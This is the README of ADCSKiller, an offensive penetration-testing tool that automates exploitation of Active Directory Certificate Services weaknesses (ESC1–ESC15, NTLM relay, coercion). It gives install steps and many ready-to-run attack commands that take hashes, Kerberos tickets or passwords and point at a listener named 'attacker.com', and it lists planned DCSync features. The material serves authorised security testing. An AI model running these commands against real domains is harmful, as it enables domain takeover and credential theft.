# ADCSKiller - An Enhanced ADCS Exploitation Automation Tool

ADCSKiller is a Python-based tool designed to automate the process of discovering and exploiting Active Directory Certificate Services (ADCS) vulnerabilities. It leverages features of Certipy and Coercer to simplify the process of attacking ADCS infrastructure. This enhanced version includes full LDAPS support, multiple authentication methods, and improved error handling.

## Features

### Core Functionality

- **LDAP/LDAPS Enumeration**: Full support for both LDAP (389) and LDAPS (636) with TLS channel binding
- **Multiple Authentication Methods**: Password, NTLM hash, Kerberos tickets, and AES keys
- **Domain Enumeration**:
  - Domain Administrators via LDAP/LDAPS
  - Domain Controllers via LDAP/LDAPS
  - Certificate Authorities via Certipy

### Automated ADCS Exploitation

- **ESC1**: Abuses misconfigured certificate templates that allow subject alternative name (SAN) specification.
- **ESC2**: Exploits templates with the "Any Purpose" or no specified Enhanced Key Usage (EKU).
- **ESC3**: Abuses templates configured for "Certificate Request Agent" (Enrollment Agent).
- **ESC4**: Exploits templates with weak access control permissions.
- **ESC6**: Takes advantage of CAs configured with EDITF_ATTRIBUTESUBJECTALTNAME2.
- **ESC8**: Automates the NTLM relay attack to the CA's HTTP/RPC endpoints.
- **ESC15**: Exploits Schema Version 1 templates that allow EKU specification (EKUwu).

### Enhanced Security Features

- **LDAPS Support**: Secure LDAP connections with SSL/TLS
- **Channel Binding**: LDAP channel binding for enhanced security
- **Kerberos Integration**: Full Kerberos authentication support
- **Flexible Authentication**: Support for various credential formats

### Operational Improvements

- **Enhanced Logging**: File and console logging with verbosity controls
- **Error Handling**: Comprehensive exception handling and timeout management
- **Modular Architecture**: Clean separation of concerns with dedicated classes
- **Configurable Timeouts**: Customizable operation timeouts
- **DNS TCP Support**: Option to use TCP for DNS queries

## Installation

Since this tool relies on Certipy and Coercer, both tools must be installed first along with additional Python dependencies.

```bash
# Install Certipy
git clone https://github.com/ly4k/Certipy && cd Certipy && python3 setup.py install

# Install Coercer
git clone https://github.com/p0dalirius/Coercer && cd Coercer && pip install -r requirements.txt && python3 setup.py install

# Install ADCSKiller
git clone https://github.com/grimlockx/ADCSKiller/ && cd ADCSKiller && pip install -r requirements.txt
```

### Requirements

```bash
pip install ldap3 python-ldap
```

## Usage

### Basic Syntax

```bash
python3 adcskiller.py -d DOMAIN -u USERNAME [AUTH_METHOD] -dc-ip TARGET -L LHOST [OPTIONS]
```

### Authentication Methods

The tool supports multiple authentication methods (choose one):

```bash
# Password authentication
python3 adcskiller.py -d domain.com -u username -p password -dc-ip 10.0.0.1 -L attacker.com

# NTLM hash authentication
python3 adcskiller.py -d domain.com -u username -H LM:NT -dc-ip 10.0.0.1 -L attacker.com

# Kerberos ticket authentication
python3 adcskiller.py -d domain.com -u username -K /path/to/ticket.ccache -dc-ip 10.0.0.1 -L attacker.com

# AES key authentication
python3 adcskiller.py -d domain.com -u username -A aes256_key -dc-ip 10.0.0.1 -L attacker.com
```

### LDAPS Examples

```bash
# Basic LDAPS connection
python3 adcskiller.py -d domain.com -u username -p password -dc-ip 10.0.0.1 -L attacker.com --ldaps

# LDAPS with channel binding (enhanced security)
python3 adcskiller.py -d domain.com -u username -H :ntlmhash -dc-ip 10.0.0.1 -L attacker.com --ldaps --ldap-channel-binding

# Custom LDAPS port
python3 adcskiller.py -d domain.com -u username -p password -dc-ip 10.0.0.1 -L attacker.com --ldaps --ldap-port 3269
```

### Advanced Options

```bash
# Verbose logging with custom output directory
python3 adcskiller.py -d domain.com -u username -p password -dc-ip 10.0.0.1 -L attacker.com --verbose -o /tmp/adcs_output

# Force Kerberos authentication with DNS TCP
python3 adcskiller.py -d domain.com -u username -p password -dc-ip 10.0.0.1 -L attacker.com --use-kerberos --dns-tcp

# Custom timeout settings
python3 adcskiller.py -d domain.com -u username -p password -dc-ip 10.0.0.1 -L attacker.com --timeout 120
```

## Command Line Options

### Required Arguments

- `-d, --domain`: Target domain name (FQDN)
- `-u, --username`: Username for authentication
- `-dc-ip, --target`: IP address of the domain controller
- `-L, --lhost`: FQDN of the listener machine

### Authentication (choose one)

- `-p, --password`: Password for authentication
- `-H, --hash`: NTLM hash for authentication (LM:NT format)
- `-K, --kerberos-ticket`: Path to Kerberos ticket file
- `-A, --aes-key`: AES key for Kerberos authentication

### LDAP Options

- `--ldaps`: Use LDAPS instead of LDAP (port 636)
- `--ldap-channel-binding`: Use LDAP channel binding (requires LDAPS)
- `--ldap-port`: Custom LDAP port

### Additional Options

- `-o, --output`: Output directory (default: current directory)
- `--timeout`: Timeout for LDAP operations (default: 100 seconds)
- `--dns-tcp`: Use TCP for DNS queries
- `-v, --verbose`: Enable verbose output and detailed logging
- `--use-kerberos`: Force Kerberos authentication when using password

## Output

The tool generates comprehensive logs and saves results to the specified output directory:

- `adcskiller.log`: Detailed execution log
- `[timestamp]_Certipy.json`: Certipy enumeration results
- Certificate files: Generated certificates (when exploitation succeeds)

## Security Considerations

- **LDAPS Usage**: Always prefer LDAPS over LDAP in production environments
- **Channel Binding**: Use `--ldap-channel-binding` for additional security when LDAPS is available
- **Credential Security**: Be cautious when using plaintext passwords; prefer hash-based authentication
- **Network Segmentation**: Ensure proper network controls are in place during testing

## Todos

### High Priority

- [ ] **ESC2-ESC7 Support**: Implement remaining ESC exploitation techniques
- [ ] **ESC9-ESC11 Support**: Add support for newer ADCS vulnerabilities
- [ ] **DC Certificate Authorities**: Enhanced support for Domain Controller CAs
- [ ] **DCSync Integration**: Automated DCSync functionality post-exploitation

### Medium Priority

- [ ] **ADIDNS Automation**: Automated ADIDNS entry creation when required
- [ ] **Enhanced Enumeration**: Principals allowed to perform DCSync
- [ ] **Alternative Tools**: Integration with dirkjanm's gettgtpkinit.py
- [ ] **Certificate Templates**: More comprehensive template enumeration

## Troubleshooting

### Common Issues

**LDAPS Connection Fails**
```bash
# Try without channel binding first
python3 adcskiller.py ... --ldaps

# If still failing, verify certificate trust or use LDAP
python3 adcskiller.py ... # (without --ldaps)
```

**Authentication Errors**
```bash
# Verify hash format (should be LM:NT)
python3 adcskiller.py ... -H aad3b435b51404eeaad3b435b51404ee:ntlmhash

# Try forcing Kerberos
python3 adcskiller.py ... --use-kerberos
```

**Timeout Issues**
```bash
# Increase timeout for slow networks
python3 adcskiller.py ... --timeout 300
```

## Credits

- Oliver Lyak for [Certipy](https://github.com/ly4k/Certipy)
- p0dalirius for [Coercer](https://github.com/p0dalirius/Coercer)
- SpecterOps for their groundbreaking research on ADCS
- S3cur3Th1sSh1t for bringing these attacks to broader attention

## License

MIT License - see LICENSE file for details.

## Disclaimer

This tool is intended for authorized penetration testing and security research only. Users are responsible for complying with applicable laws and obtaining proper authorization before use.
